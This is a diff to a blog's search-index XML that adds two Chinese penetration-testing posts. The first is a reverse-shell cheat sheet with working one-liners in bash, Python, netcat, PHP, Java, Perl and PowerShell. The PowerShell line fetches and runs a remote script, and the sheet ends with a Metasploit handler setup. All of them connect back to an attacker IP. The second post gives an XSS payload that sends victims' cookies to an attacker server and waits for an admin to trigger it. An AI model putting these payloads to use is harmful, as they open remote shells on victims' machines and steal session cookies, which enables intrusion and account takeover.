@@ -1,6 +1,69 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>常见反向shell方法</title>
+    <url>/2020/%E5%B8%B8%E7%94%A8%E5%8F%8D%E5%90%91shell.html</url>
+    <content><![CDATA[<h2 id="常见反向shell生成与使用方法："><a href="#常见反向shell生成与使用方法：" class="headerlink" title="常见反向shell生成与使用方法："></a>常见反向shell生成与使用方法：</h2><p>​    如果目标存在命令/代码执行漏洞，可用此些方法获取shell。</p>
+<h3 id="Bash："><a href="#Bash：" class="headerlink" title="Bash："></a>Bash：</h3><p>​    Attacker：nc  -lvvp  4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash -i  &gt;&amp; /dev/tcp/Attacker_IP/4444  0&gt;&amp;1</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Python："><a href="#Python：" class="headerlink" title="Python："></a>Python：</h3><p>​    Attacker：nc  -lvvp  4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">python -c <span class="string">'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("172.16.1.130",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Netcat-nc-："><a href="#Netcat-nc-：" class="headerlink" title="Netcat(nc)："></a>Netcat(nc)：</h3><p>​    如果目标机器存在nc且有-e参数，那么可以使用nc建立反向shell</p>
+<p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">nc -e  /bin/bash  Attacker_IP 4444</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="PHP"><a href="#PHP" class="headerlink" title="PHP"></a>PHP</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">php -r <span class="string">'$sock=fsockopen("172.16.1.130",4444);exec("/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3");'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Java："><a href="#Java：" class="headerlink" title="Java："></a>Java：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer ：</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">r = Runtime.getRuntime()</span><br><span class="line">p = r.exec([<span class="string">"/bin/bash"</span>,<span class="string">"-c"</span>,<span class="string">"exec 5&lt;&gt;/dev/tcp/172.16.1.130/4444;cat &lt;&amp;5 | while read line; do $line 2&gt;&amp;5 &gt;&amp;5; done"</span>] as String[])</span><br><span class="line">p.waitFor()</span><br></pre></td></tr></table></figure>
+
+<h3 id="Perl："><a href="#Perl：" class="headerlink" title="Perl："></a>Perl：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight perl"><table><tr><td class="code"><pre><span class="line">perl -e <span class="string">'use Socket;$i="172.16.1.130";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;open(STDIN,"&gt;&amp;S");open(STDOUT,"&gt;&amp;S");open(STDERR,"&gt;&amp;S");exec("/bin/sh -i");&#125;;'</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Powershell："><a href="#Powershell：" class="headerlink" title="Powershell："></a>Powershell：</h3><p>​    Attacker：nc  -lvvp 4444</p>
+<p>​    Victimer：</p>
+<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line">powershell IEX (<span class="built_in">New-Object</span> Net.WebClient).DownloadString(<span class="string">'https://raw.githubusercontent.com/samratashok/nishang/9a3c747bcf535ef82dc4c5c66aac36db47c2afde/Shells/Invoke-PowerShellTcp.ps1'</span>);<span class="built_in">Invoke-PowerShellTcp</span> <span class="literal">-Reverse</span> <span class="literal">-IPAddress</span> <span class="number">172.16</span>.<span class="number">1.130</span> <span class="literal">-port</span> <span class="number">4444</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="Xterm："><a href="#Xterm：" class="headerlink" title="Xterm："></a>Xterm：</h3><p>​    Victimer:  </p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">xterm -display Attacker_IP:1</span><br></pre></td></tr></table></figure>
+
+<p>​    Attacker:</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">Xnest :1</span><br><span class="line">xhost +Victimer_IP</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="Msfvenom连接一句话："><a href="#Msfvenom连接一句话：" class="headerlink" title="Msfvenom连接一句话："></a>Msfvenom连接一句话：</h3><p>msf支持多种反弹方式，比如exe ps php asp aspx甚至是ruby等，我们可以用msfvenom来生成payload，然后在msf中监听，执行之后就会反弹回来session。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">msfconsole</span><br><span class="line">use exploit/multi/handler</span><br><span class="line"><span class="built_in">set</span> PAYLOAD windows/meterpreter/reverse_tcp</span><br><span class="line"><span class="built_in">set</span> LHOST 172.16.1.130</span><br><span class="line"><span class="built_in">set</span> LPORT 4444</span><br><span class="line"><span class="built_in">set</span> ExitOnSession <span class="literal">false</span></span><br><span class="line">exploit -j -z</span><br></pre></td></tr></table></figure>]]></content>
+      <categories>
+        <category>渗透测试</category>
+      </categories>
+  </entry>
+  <entry>
+    <title>简易xss平台 获取Cookie</title>
+    <url>/2020/xss%E8%8E%B7%E5%8F%96.html</url>
+    <content><![CDATA[<p>1、启用python http服务器</p>
+<img src="../images/upload/python3.png" style="zoom:67%;" />
+
+<p>2、在有xss的地方插入截获代码</p>
+<figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">&lt;script&gt;<span class="built_in">document</span>.write(<span class="string">'&lt;img src="http://192.168.56.109/'</span>+<span class="built_in">document</span>.cookie+<span class="string">'" width=0 height=0 border=0 /&gt;'</span>);&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>3、等待管理员触发漏洞后，便会截获到cookie</p>
+<img src="../images/upload/cookie.png" style="zoom: 67%;" />]]></content>
+  </entry>
+  <entry>
     <title>linux 查看硬件架构|系统版本|内核版本</title>
     <url>/2020/linux%E7%89%88%E6%9C%AC.html</url>
     <content><![CDATA[<p><font color=green>有时候,我们可能需要获取Linux系统的一些关键信息,以下列举了部分常用的命令做为备忘📝</font></p>
